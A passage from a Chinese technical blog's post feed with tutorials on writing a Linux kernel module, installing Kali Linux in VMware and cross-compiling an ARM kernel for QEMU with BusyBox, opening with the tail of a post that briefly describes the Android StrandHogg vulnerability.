更新。此外还有很多针对手机的攻击，例如针对安卓的Strandhogg漏洞，包括最新Android10在内的所有Android版本，都存在Strandhogg漏洞。不法攻击者可以利用StrandHogg漏洞，使用BankBot银行木马等恶意软件，悄无声息地盗走用户的银行卡内余额。此外它还能访问你的摄像头和麦克风，获取设备的位置，读取短信，访问你的私人照片和视频，访问联系人……只要成功利用Strandhogg漏洞，攻击者可以随意获取上述信息。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> Linux </tag>
            
            <tag> Kali </tag>
            
            <tag> Exploit </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编写我的第一个Linux 内核模块“hello_module</title>
      <link href="/posts/19043/"/>
      <url>/posts/19043/</url>
      
        <content type="html"><![CDATA[<blockquote><p> 前言：</p><p> Linux 内 核 模 块 全 称 为 “ 动 态 可 加 载 内 核 模 块 (Loadable Kernel Module,LKM)”，是系统内核向外部提供的功能插口。作为宏内核结构，Linux 内核具有效率高的特点，但也有可扩展性和可维护性相对较差的不足，Linux 提供模块机制正是弥补这一缺陷。</p><p> 模块是具有独立功能的程序，它可以被单独编译，但不能独立运行。模块在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户控件的进程是不同的。模块通常有一组函数和数据结构组成，用来实现某种文件系统、驱动程序或其它内核上层功能。 </p><p> 本文将介绍如何编写一个简单的内核模块以及如何传递参数给此模块。 </p></blockquote><h4 id="一、-编写一个简单的内核模块"><a href="#一、-编写一个简单的内核模块" class="headerlink" title="一、 编写一个简单的内核模块"></a>一、 编写一个简单的内核模块</h4><h5 id="1-编写模块程序"><a href="#1-编写模块程序" class="headerlink" title="1.编写模块程序"></a>1.编写模块程序</h5><p>编写如下简单代码，本示例中代码文件命名“hello_module.c”。 </p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hello_module.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">hello_init</span><span class="params">(<span class="type">void</span>)</span>{</span><br><span class="line">   printk(<span class="string">"This is hello_module, welcome to Linux kernel \n"</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">hello_exit</span><span class="params">(<span class="type">void</span>)</span>{</span><br><span class="line">   printk(<span class="string">"see you next time!\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"Mr Q"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"hello kernel module"</span>);</span><br><span class="line">MODULE_ALIAS(<span class="string">"hello"</span>);</span><br></pre></td></tr></tbody></table></figure><blockquote><p>以上代码解释如下:</p><p>（1） #include &lt;linux/module.h&gt;：必须。module.h 头文件包含了对模块的结构定义以及模块的版本控制，任何模块程序的编写都要包含这个头文件；</p><p>（2） #include &lt;linux/kernel.h&gt;：kernel.h 包含了常用的内核函数，如以上程序中的 printk()函数；</p><p>（3） #include &lt;linux/init.h&gt;：必须。init.h 包含了 module_init()和 module_exit()函数的声明；</p><p>（4） module_init()：必须。模块加载函数，加载模块式该函数自动执行，进行初始化操作；</p><p>（5） module_exit()：必须。模块卸载函数，卸载模块时函数自动执行，进行清理操作；</p><p>（6） MODULE_LICENSE():表示模块代码接受的软件许可协议。Linux 内核是使用 GPL V2 的开源项目，其要求所有使用和修改了 Linux 内核代码的个人或组织都有义务把修改后的源代码公开，这是一个强制的开源协议，所以一般编写驱动代码都需要显示的声明和遵循本协议，否则内核 UI 发出被污染的警告；</p><p>（7） MODULE_AUTHOR():描述模块的作者信息；</p><p>（8） MODULE_DESCRIPTION():简单描述模块的用途、功能介绍等；</p><p>（9） MODULE_ALIAS():为用户控件提供的别名；</p><p>（10） printk():内核输出函数，默认打印系统文件 “ /var/log/kern.log”的内容。  </p></blockquote><h5 id="2-编译内核模块"><a href="#2-编译内核模块" class="headerlink" title="2. 编译内核模块"></a>2. 编译内核模块</h5><p>编写 Makefile 文件，文件名必须为“Makefile”  </p><figure class="highlight makefile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">obj-m := hello_module.o</span><br><span class="line"></span><br><span class="line">KERNELBUILD := /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line">CURRENT_PATH := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">make -C <span class="variable">$(KERNELBUILD)</span> M=<span class="variable">$(CURRENT_PATH)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">make -C <span class="variable">$(KERNELBUILD)</span> M=<span class="variable">$(CURRENT_PATH)</span> clean</span><br></pre></td></tr></tbody></table></figure><blockquote><p>以上代码解释如下:</p><p>（1） obj-m := &lt;模块名&gt;.o：定义要生成的模块名称</p><p>（2） KERNELBUILD := /lib/modules/$(shell uname -r)/build ：</p><p>KERNELBUILD 为自定义名称，用于指向正在运行 Linux 的内核编译目录，其中“uname -r”标识显示对应的内核版本；</p><p>（3） CURRENT_PATH := $(shell pwd)：CURRENT_PATH 为自定义名称，用于指向当前当前目录；</p><p>（4） all:编译执行的动作</p><p>（5） clean:zhixing make clean 需要的动作。“make clean”用于清除上次的 make 命令所产生的 object 文件（后缀为“.o”的文件）及可执行文件。    </p></blockquote><h5 id="3-编译"><a href="#3-编译" class="headerlink" title="3.编译"></a>3.编译</h5><p>将以上两个文件(hello_module.c 和 Makefile)保存于同一目录下，将上文中代码存放在路径为“/code/hellomodule/”，编译需在文件保存目录中进行。  </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/19043/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvZ1VlVzN0N0lQaWRPMkdyLnBuZw" alt="image-20200608113407988"></p><p>编译成功后，可看到生成的 hello_module.ko 目标文件  </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/19043/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvOXg4MVBSd21pWERZdVFaLnBuZw" alt="image-20200608113502338"></p><h5 id="4-检查编译模块"><a href="#4-检查编译模块" class="headerlink" title="4.检查编译模块"></a>4.检查编译模块</h5><p>可通过 file 命令检查编译的模块是否正确，可以看到 x86-64 架构的 elf文件，说明编译成功:</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/19043/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvUHNMdVJGSGlNTzZRbXJYLnBuZw" alt="image-20200608113816662">  </p><p>也可通过 modinfo 命令进一步检查 :</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/19043/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvRE9GTXp1dHNtS3BuWUxhLnBuZw" alt="image-20200608114046227"></p><h5 id="5-插入模块"><a href="#5-插入模块" class="headerlink" title="5.插入模块"></a>5.插入模块</h5><p>通过 insmod 命令插入模块，完成插入后可通过 lsmod 命令查看当前模块是否已经被加载到系统中:</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/19043/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvM1NQVXhhbXFpQ2R2T0dGLnBuZw" alt="image-20200608115103707"></p><p>系统加载模块后，也会在“/sys/module”目录下新建以模块名命名的目录 :</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/19043/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvSFlVTU5ramJHbW82Q252LnBuZw" alt="image-20200608115252879"></p><h5 id="6-查看输出"><a href="#6-查看输出" class="headerlink" title="6.查看输出"></a>6.查看输出</h5><p>   因 本 演示 中 prink()采 用 默认 输出 等级 ，可 通 过“ dmesg” 或“ tail /var/log/kern.log”命令查看输出结果。  </p><p>   <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/19043/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvNzVqdWdBcE9XRVNNeWFULnBuZw" alt="image-20200608115615691"></p><p>“  tail /var/log/kern.log”命令查看输出结果：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/19043/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvSkM3bnBWa3h2RXNoR2xXLnBuZw" alt="image-20200608115832820"></p><h5 id="7-卸载模块"><a href="#7-卸载模块" class="headerlink" title="7. 卸载模块"></a>7. 卸载模块</h5><p>   卸载模块，可通过“rmmod 模块名”实现，通 过“ tail /var/log/kern.log”命令查看输出结果。  </p><p>   <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/19043/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvdlJVSkZsemptdVNpSURyLnBuZw" alt="image-20200608120215696"></p><h4 id="二、-模块参数"><a href="#二、-模块参数" class="headerlink" title="二、 模块参数"></a>二、 模块参数</h4><h5 id="1-说明"><a href="#1-说明" class="headerlink" title="1.说明"></a>1.说明</h5><p>Linux 内核提供一个宏来实现模块的参数传递</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> module_param(name, type, perm) \</span></span><br><span class="line"><span class="meta">module_param_named(name, name, type, perm)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MODULE_PARM_DESC(_parm, desc) \</span></span><br><span class="line"><span class="meta">_MODULE_INFO(parm, _parm, #_parm <span class="string">":"</span> desc);</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>module_param()宏由 3 个参数组成，name 表示参数名，type 表示参数类型，perm 表示参数读写权限。MODULE_PARM_DESC()宏提供参数的简单说明，参数类型可为 byte、short、int、long、char、bool 等类型；perm 指定在 sysfs 中相应文件的访问权限，如设置为 0 则不会出现在 sysfs 文件系统中，设置为 0644 标识 root 用户可修改本参数。  </p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> debug = <span class="number">1</span>;</span><br><span class="line">module_param(debug, <span class="type">int</span>, <span class="number">0644</span>);</span><br><span class="line">MODULE_PARM_DESC(debug, <span class="string">"enable debugging information"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> dprintk(args...) <span class="keyword">if</span>(debug){printk(KERN_DEBUG args);}</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>如上述实际代码所示（driver/misc/altera-stap1/altera.c），实际定义模块参数 debug,类型是 int,访问权限是 0644。参数用途是大概调试信息，实际内核编程中常用此方法进行内核调试。  </p></blockquote><h5 id="2-开始动手"><a href="#2-开始动手" class="headerlink" title="2.开始动手"></a>2.开始动手</h5><p>修改上文中的“hello_module.c”文件，改为以下内容：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hello_module.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> debug = <span class="number">1</span>;</span><br><span class="line">module_param(debug, <span class="type">int</span>, <span class="number">0644</span>);</span><br><span class="line">MODULE_PARM_DESC(debug, <span class="string">"debugging information"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> dprintk(args...) <span class="keyword">if</span>(debug){printk(KERN_DEBUG args);}</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> myparm = <span class="number">10</span>;</span><br><span class="line">module_param(myparm, <span class="type">int</span>, <span class="number">0644</span>);</span><br><span class="line">MODULE_PARM_DESC(myparm, <span class="string">"kernel module parameter experiment."</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">parm_init</span><span class="params">(<span class="type">void</span>)</span>{</span><br><span class="line">   dprintk(<span class="string">"my linux kernel module init.\n"</span>);</span><br><span class="line">   dprintk(<span class="string">"module parameter = %d\n"</span>, myparm);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">parm_exit</span><span class="params">(<span class="type">void</span>)</span>{</span><br><span class="line">   printk(<span class="string">"see you next time!\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">module_init(parm_init);</span><br><span class="line">module_exit(parm_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"Mr Q"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"kernel module paramter experiment"</span>);</span><br><span class="line">MODULE_ALIAS(<span class="string">"myparm"</span>);</span><br></pre></td></tr></tbody></table></figure><p>make编译，装载模块，并查看输出:</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/19043/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvV1p0QlZEQ1g3R25SZTlsLnBuZw" alt="image-20200608122047862"></p><blockquote><p>通过查看日志信息，可发现输出以上程序中 参数 的默认值。  </p></blockquote><p>卸载模块，赋值重新加载模块,修改参数 myparm 值为 116：  </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insmod parm_module.ko myparm=116  </span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/19043/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvZjdXNnF0ZGtVRDRPTDlvLnBuZw" alt="image-20200608122350054"></p><blockquote><p>通过查看日志信息，可发现 参数 值已经改变。  </p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Kernel </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMware虚拟机安装kali 2020.2</title>
      <link href="/posts/55435/"/>
      <url>/posts/55435/</url>
      
        <content type="html"><![CDATA[<p>1.打开Kali官网下载镜像,这里直接选择VMware</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/55435/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjIvNnFYMk0zZWtpS0p4VzdBLnBuZw.png" alt="image-20200522151450024"></p><p>2.解压然后在VMware中点击”文件-打开”导入虚拟机</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/55435/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjIvczRDMVNWbmlmb0ljUUU3LnBuZw.png" alt="image-20200522152239751"></p><p>3.点编辑设置打开虚拟化选项(没有此选项的点击升级此虚拟机,还没有的就检查BIOS设置)</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/55435/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjIvVklyZ2VzVVlTa3k4M3Z0LnBuZw.png" alt="image-20200522152710641"></p><p>4.点击开启此虚拟机,用户名和密码在虚拟机描述里有(2020版用户名和密码都是kali)</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/55435/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjIvSXNRdzJEMUNBbjRZcTdsLnBuZw.png" alt="image-20200522153301414"></p><p>5.设置kali语言为中文</p><p>虚拟机默认语言为英文</p><p>设置步骤如下</p><p>(1)终端输入代码</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> dpkg-reconfigure locales</span><br></pre></td></tr></tbody></table></figure><p>然后选择字符编码： en_US.UTF-8、zh_CN.GBK、zh_CN.UTF-8 （用空格选定）</p><p>接着选择字符： zh_CN.UTF-8 选定后回车确认</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/55435/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjIvUlFqdnVicGkzeGhWR1NjLnBuZw.png" alt="image-20200522155355777"></p><p>(2)接着输入如下代码安装字体,如果没有成功看(3)</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install ttf-wqy-microhei ttf-wqy-zenhei xfonts-wqy</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>(3)换阿里云源</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vim /etc/apt/sources.list</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>或者图形化:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> mousepad  /etc/apt/sources.list</span><br></pre></td></tr></tbody></table></figure><p>先备份原文并将这一段覆盖原文</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># aliyun </span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></tbody></table></figure><p>更新源</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get update </span><br></pre></td></tr></tbody></table></figure><p>(4)重启后就变为中文了</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Kali </tag>
            
            <tag> 虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核的编译</title>
      <link href="/posts/2461/"/>
      <url>/posts/2461/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：</p><p>常见 Linux 内核编译有两种方式，一是直接在 Linux 系统上编译得到二进制文件，并对原有 Linux 内核进行替换，即更换 Linux 内核，此方法可能因新内核有 bug 导致系统奔溃，且难以返回原版本内核而不得不重装；第二种方法则是在模拟器中运行新的 Linux 内核，以避免对系统内核的修改。</p><p>BusyBox 是一个集成了三百多个最常用 Linux 命令和工具的软件，因为单独的 Linux 内核无任何用于用户交互的 UI，所以需要通过其它工具与新编译的Linux 内核交互。</p><p>QEMU 是以 GPL 许可证分发源码的模拟处理器，可用于模拟常见的硬件平台，常用于在 Linux 系统中建立虚拟机。</p><p>本文在阿里云 Ubuntu 18.04 64 位操作系统环境下编译 ARM Linux 内核。过程中主要是用交叉编译工具链 gcc-arm-linux-gnueabi 编译系统源码，并使用 QEMU 软件仿真硬件平台测试对象系统。</p><p>**建议使用 root 用户操作  **</p></blockquote><p><strong>本文所使用的环境：</strong></p><blockquote><p>操作系统：4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</p><p>gcc: 7.5.0</p><p>qemu: 2.11.1(Debian 1:2.11+dfsg-1ubuntu7.26)</p><p>make:GNU Make 4.1</p></blockquote><ol><li><h5 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h5><p>Busybox 需手动下载安装，QEMU 等其他工具可在线安装。  </p><p>Linux内核下载：<a href="https://www.kernel.org/">https://www.kernel.org/</a></p><p>本文使用5.4.45版本的,并使用清华大学镜像</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.4.5.tar.gz</span><br></pre></td></tr></tbody></table></figure><p>Busybox ：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://busybox.net/downloads/busybox-1.28.4.tar.bz2</span><br></pre></td></tr></tbody></table></figure></li><li><p>环境配置</p><p>Linux 内核编译环境需要大量软件包，可提前直接在线安装，或在内核编译的过程中安装，若缺少安装包，内核编译过程中会提示缺失错误。以下是部分需要的软件包，其中部分相同功能的软件包在不同的 Linux 版本下会以不同的名字存在。  </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gcc qemu qemu-system-arm gcc-arm-linux-gnueabi libncurses5-dev build-essential flex bison bc  </span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvbnZ6d0ViUDZjMzVObDh0LnBuZw.png" alt="image-20200607225302378"></p></li><li><h5 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h5><p><strong>解压 Linux 内核文件包：</strong> </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf linux-5.4.5.tar.gz</span><br></pre></td></tr></tbody></table></figure><p><strong>编译最小文件系统：</strong>  </p><p>解压 busybox,进入目录并编译:  </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -jxvf busybox-1.28.4.tar.bz2</span><br><span class="line"><span class="built_in">cd</span> busybox-1.28.4</span><br><span class="line"><span class="built_in">export</span> ARCH=arm</span><br><span class="line"><span class="built_in">export</span> CROSS_COMPILE=arm-linux-gnueabi-</span><br><span class="line">make menuconfig</span><br></pre></td></tr></tbody></table></figure><p>以上内容中，“export”后是指定交叉编译工具链，指定芯片框架为 ARM。如下图所示是图形化界面进行内核配置。  </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvb0wydXdBSGtNOHJmSVVSLnBuZw.png" alt="image-20200607231737776"></p><blockquote><p>按照以下路径配置成静态编译（回车进入，空格选中） ：</p><p>Settings —-&gt;</p><p>　　Build Options<br>　　　　　　　[*]Build static binary(no shared libs)  </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvVGhwZW9meEh6REttQnZuLnBuZw.png" alt="image-20200607232057964"></p></blockquote><p>配置完毕退出后继续完成编译：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install  </span><br></pre></td></tr></tbody></table></figure><p>完成后会在目录中生成“_install”目录，本目录存放了编译好的文件系统需要的命令集合，如下图所示：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvRWM3MWZ6bjU4aEJRVlkyLnBuZw.png" alt="image-20200607233324632">  </p><p>将上一步骤中生成的“_install”目录拷贝至之前解压后的内核目录，进入“_install”目录，分别创建 etc、dev、mnt、etc/init.d 等目录。  </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> -r ./busybox-1.28.4/_install ./linux-5.4.5/_install</span><br><span class="line"><span class="built_in">cd</span> ./linux-5.4.5/_install/</span><br><span class="line"><span class="built_in">mkdir</span> etc</span><br><span class="line"><span class="built_in">mkdir</span> dev</span><br><span class="line"><span class="built_in">mkdir</span> mnt</span><br><span class="line"><span class="built_in">mkdir</span> -p etc/init.d</span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/2461/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMDgvVlR2RFJzNjlKN0lGdVFOLnBuZw.png" alt="image-20200607234014872"></p><p>在“_install/etc/init.d”目录下新建“rcS”文件，并写入以下内容：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /proc</span><br><span class="line"><span class="built_in">mkdir</span> -p /tmp</span><br><span class="line"><span class="built_in">mkdir</span> -p /sys</span><br><span class="line"><span class="built_in">mkdir</span> -p /mnt</span><br><span class="line">/bin/mount -a</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line"><span class="built_in">echo</span> /sbin/mdev &gt; /proc/sys/kernel/hotplug</span><br><span class="line">mdev –s  </span><br></pre></td></tr></tbody></table></figure><p><img src= 